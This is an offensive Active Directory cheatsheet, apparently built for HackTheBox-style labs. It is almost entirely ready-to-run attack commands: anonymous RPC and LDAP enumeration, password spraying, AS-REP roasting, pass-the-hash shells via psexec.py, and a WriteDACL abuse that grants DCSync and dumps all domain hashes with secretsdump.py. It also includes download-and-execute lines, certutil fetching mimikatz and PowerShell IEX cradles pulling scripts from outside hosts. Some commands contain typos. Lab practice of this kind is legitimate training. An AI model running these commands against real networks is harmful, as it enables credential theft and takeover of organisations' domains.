# Active Directory Cheatsheet

## TTL at Ping command:
>> At windows boxes ttl is usually 128
\
>> At linux boxes ttl is ususally 64
\
>> (maybe ^^)

## RPC Enumeration:
```bash
rpcclient -U "" -N "IP" 		(Null session)
```
### Once connected:
> enumdomusers
\
> enumdomgroups
\
> enumprinters
\
> querygroup "RID"
\
> querygroupmem "RID"
\
> queryuser "RID"
\
> getdomainpwinfo
\
> getdomuserpwinfo "RID"

>> Can also do password spraying through it

## dig:


## Zone Transfers:


## Group Policy Decrypt (If we have SYSVOL):


## nslookup (Can give DNS records):
```bash
nslookup
> server "IP ADDRESS OF DNS SERVER"
> 127.0.0.1 (Reverse Lookup)
> "MACHINE IP ADDRESS" (Reverse Lookup of a Machine)
```

## ldapsearch (to query ldap server for domain names and other information):
>> -x = Anonymous bind
\
>> -h = host
```bash
ldapsearch -x -h "IP"
```
>> -s = scope (which is usually set to base)
\
>> namingcontext = finding  the domain name
```bash
ldapsearch -x -h "IP" -s base namingcontext
```
>> -b = base
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")"
```
>> This will give a lot of ldap information
\
>> To search the output using ldapsearch we can use
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' # 
This will give out the users list on the ldap server
```
>> To get usernames out of it we can do 
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=Person)' sAMAccountName
```
>> To filter for usernames just use grep
```bash
ldapsearch -x -h "IP" -b "USUALLT THE FIRST DN (e.g; -b "DC=htb,DC=local")" '(objectClass=User)' sAMAccountName | grep -i sAMAccountName | awk '{print $2}'
```

## Generating password list from a list of common passwords:
>> Make a password list of all months, seasons, common words like password, secret
\
>> Then use bash to add years to them
```bash
for i in $(cat passwords.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > t
mv t > passlist.txt
```
>> Then use hashcat to generate pass list
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule
```
>> Also adding a symbol to password
```bash
for i in $(cat passwords.txt); do echo $i; echo ${i}\!; done > t
mv t > passlist.txt
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule
```
>> We can use another rule to embed cpaital letters in the passlist
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule
```
>> But it may have duplicates so
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule | sort -u > p
```
>> To just get the passwords which have length more than 7
```bash
hashcat --force --stdout passlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggels1.rule | sort -u | awk 'length($0) > 7' > p
mv p > passlist.txt
```

## Crackmapexec:
>> To check for password policy before doing a password spray to avoid account lockdown
```bash
crackmapexec smb "IP ADDRESS" --pass-pol -u '' -p ''
```
>> We can also see it from `enum4linux` or `polenum`
\
>> To do password spraying attack we can do 
```bash
crackmapexec smb "IP ADDRESS" -u "USER LIST" -p "PASS LIST"
```
>> If we get a password we can then login to it
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -p "PASSWORD"
```
>> If it says `pwned!` we can then use `psexec.py` to open up a shell
\
>> If not we can see if we can list shares using it
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -p "PASSWORD" --shares
```
>> We can use crackmapexec to also login using hashes
```bash
crackmapexec smb "IP ADDRESS" -u "USERNAME" -H "HASH"
```

## psexec.py:
>> We can use `psexec.py` to login using the hashes
```bash
psexec.py --hashes "NT:LM" "USERNAME"@"IP ADDRESS"
```

## AS-REP Roasting:
>> This attack is used for users that do not need preauthentication in kerberos
```bash
GetNPUsers.py -dc-ip "IP ADDRESS" -request "'DOMAIN/'" -format hashcat
```
>> Also can be done using a username list 
```bash
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip "IP ADDRESS" "DOMAIN"/${user} -format hashcat | grep -v Impacket; done
```
>> We can then crack it using hashcat or john
```bash
hashcat -m 18200 hash.txt ~/Desktop/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
john --format=krb5asrep -w=~/Desktop/rockyou.txt hash.txt
```

## Evil-WinRM:
>> If we have password and username for a user or service account, with winrm enabled, we can use this to login
```bash
evil-winrm -u "USERNAME" -p "PASSWORD" -i "IP ADDRESS"
```

## Privilege Escalation Methods:
>> Winpeas.exe (To find)
\
>> Unquoted Service Paths

## File Transfer Methods:
>> SMB Server
```bash
impacket-smbserver "SHARE NAME" $(pwd) -smb2support -user "USERNAME" -password "PASSWORD" # Starts the SMB Server

# ON WINDOWS
$pass = convertto-sevurestring "PASSWORD" -AsPlainText -Force # To convert it to useable password
$cred = New-Object System.Management.Automation.PSCredential("'USERNAME'", $pass) # Setting up cred object with username and password
New-PSDrive -Name "USERNAME" -PSProvider FileSystem -Credential $cred -Root \\"IP ADDRESS"\"SHARE NAME # Connecting the drive to windows
cd "USERNAME": # Get into the drive
```
>> Cert Util
```powershell
certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe
```
>> Powershell
```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.14.12.230/CLSID.ps1'")

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"

powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")

Invoke-WebRequest "http://10.14.12.230/CLSID.ps1" -OutFile "CLSID.ps1"
```

## Bloodhound:
>> Download a new copy of bloodhound because it gets updated frequently
\
>> To get a new neo4j account we can delete the password file
```bash
locate neo4j | grep auth # Delete the auth file
bloodhound --no-sandbox # Start bloodhound with the password you set earlier

.\SharpHound.exe -c all # On Windows
```
>> You can change things in `SharpHound` to make more stealthy

## Rubeus:
>> 

## DACLs/ACLs:
`acl-pwn`
>> Resource = https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse
\
>> We can abuse the DACLs/ACLs to pwn the Active Directory Network
\
>> `WriteDACL`
\
>>> Can lead to DCSync Attack
\
>>> Import `PowerView.ps1`
\
>>> Use the commands mentioned in `Abuse Info` of `WriteDACL` in `BloodHound`
```powershell
$pass = convertto-securestring "PASSWORD OF USER THAT HAS WRITE DACL PERMS" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('"DOMAIN"\"PASSWORD OF USER THAT HAS WRITE DACL PERMS"', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DOMAIN BUT IN LDAP FORMAT (DC=htb, DC=local)" -PrincipalIdentity "USERNAME" -Rights DCSync
```
>>> Then we can use `secretsdump.py` to dump everything
```bash
secretsdump.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
```
>>> We can then use these hashes to see if we pwn any user using `crackmapexec`
\
>>> If pwned we can use them with `psexec.py` to get a shell
\
>>> We can also try to crack teh hases using `hashcat`
```bash
hashcat -m 1000 hashes ~/Desktop/rockyou.txt -r InsidePro-PasswordsPro.rule
```